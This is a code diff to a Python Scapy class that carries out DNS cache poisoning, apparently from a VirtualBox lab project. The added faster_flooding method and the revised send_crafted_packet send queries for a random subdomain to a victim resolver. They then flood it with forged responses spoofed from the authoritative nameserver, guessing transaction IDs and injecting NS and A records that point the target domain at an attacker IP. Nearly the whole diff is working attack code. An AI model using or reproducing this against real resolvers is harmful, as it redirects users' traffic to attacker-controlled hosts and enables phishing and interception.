@@ -31,7 +31,10 @@ class DNSPoisoning:
         self.attacker_ip = attacker_ip
         self.id = initial_id
         self.sport = 53
+
+        self.nic_interface = None
         self.flood_socket = None
+
         self.auth_nameserver = authoritative_nameserver
         self.flood_pool = None
 
@@ -42,7 +45,67 @@ class DNSPoisoning:
 
         self.invalid_url = 'x' + str(random.randint(10,1000)) + 'x.' + self.spoofed_domain
 
+
+        self.victim_mac = "08:00:27:be:48:1d"
+        self.attacker_mac = "0a:00:27:00:00:00"
+
         log("Invalid URL used: " + self.invalid_url)
+
+
+    def set_interface(self, interface):
+        self.nic_interface = interface
+
+    def open_socket(self):
+        if self.flood_socket != None:
+            self.flood_socket.close()
+        self.log("Opening socket...")
+        self.flood_socket = conf.L3socket(iface=self.nic_interface) #TODO: Put this in the parameter
+
+
+    def faster_flooding(self):
+       ##!@brief Send Crafted Packet
+
+        pkts = []
+        number_of_query = 200
+        number_of_response = 900
+        spacing = 200
+
+        #for queryID in range(number_of_query):
+        #    query = Ether(dst=self.victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=queryID, rd=1,qd=DNSQR(qname=self.invalid_url))
+        #    pkts.append(query)
+
+        print("Sending {t.bold}{t.blue}{n_query}{t.normal} queries".format(t=self.t, n_query=number_of_query))
+        print("Range from {t.bold}{t.blue}{int_id} to {fin_id}{t.normal}".format(int_id= self.id, fin_id= (self.id+1000) % 65535-1, t=self.t))
+        
+        query = Ether(dst=self.victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))
+
+
+        for ID in range (self.id +spacing,(self.id + number_of_response + spacing) % 65535-1):
+        #for i in range(500):    
+
+            #if ID % 5 == 0:
+            query = Ether(dst=self.victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))
+            pkts.append(query)
+
+            crafted_response = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
+                /UDP(dport=53, sport=53)\
+                    /DNS(id=ID,\
+                        qr=1,\
+                        #rd=1,\
+                        ra=1,\
+                        aa=1,\
+                        qd=DNSQR(qname=self.invalid_url, qtype="A", qclass='IN'),\
+                        ar=DNSRR(rrname='ns.' + self.spoofed_domain, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip)/DNSRR(rrname=self.spoofed_domain, type='A', rclass='IN', ttl=70000, rdata=self.attacker_ip),\
+                        ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=70000, rdata='ns.' + self.spoofed_domain + '.')\
+                    )
+
+            pkts.append(crafted_response)
+
+
+        print("Initial Query sended, start flooding")
+
+
+        sendp(pkts, verbose=1, iface='vboxnet0')
 
 
     ##  Send crafted packet
@@ -63,9 +126,7 @@ class DNSPoisoning:
     #
 
     def send_crafted_packet(self, id_req):
-        ##!@brief Send Crafted Packet
-
-        
+ 
         #print("Using ID: " + str(id_req), end='') 
             
         #First type of attack
@@ -78,10 +139,13 @@ class DNSPoisoning:
         #qdcount = number of question
         #ancount = number of answer
 
+        ID = id_req % 65535
+
+
         #TODO: check recursion available
-        crafted_response_1 = IP(dst=self.victim_server, src=self.auth_nameserver)\
+        crafted_response_1 = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
             /UDP(dport=53, sport=53)\
-                /DNS(id=id_req,\
+                /DNS(id=ID,\
                     qr=1,\
                     #rd=1,\
                     ra=1,\
@@ -119,11 +183,11 @@ class DNSPoisoning:
     def send_inital_query(self):
         #self.sport = random.randint(1024, 65536)
 
-        logging.info("Used ID %d", self.id)
+        self.log("Sending invalid URL query.. ")
 
         query = IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(rd=1,qd=DNSQR(qname=self.invalid_url))
 
-        send(query)
+        self.flood_socket.send(query)
 
 
     def start_flooding(self):
@@ -140,9 +204,8 @@ class DNSPoisoning:
         self.log("\nUsing ID from {t.bold}{t.blue}{initial}{t.normal} to {t.bold}{t.blue}{final}{t.normal}\n".format(initial=self.id + spacing, final=self.id + spacing + number_of_guess, t=self.t))
 
         #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
-        self.log("Opening socket for faster flood...")
-        self.flood_socket = conf.L3socket(iface='vboxnet0') #TODO: Put this in the parameter
-
+        self.log("Same socket for faster flood...")
+        self.open_socket()
         self.flood_pool = ThreadPool(number_of_guess)
 
         result = self.flood_pool.map(self.send_crafted_packet, id_range)
@@ -173,7 +236,7 @@ class DNSPoisoning:
     def stop_handler(self, sig, frame):
         self.log("Closing socket")
         self.flood_socket.close()
-        self.flood_pool.terminate()
+        #self.flood_pool.terminate()
         self.log("Cache poisoning stopped")
 
         if self.interrupt_handler  != None:     #If an interrupt handler is passed
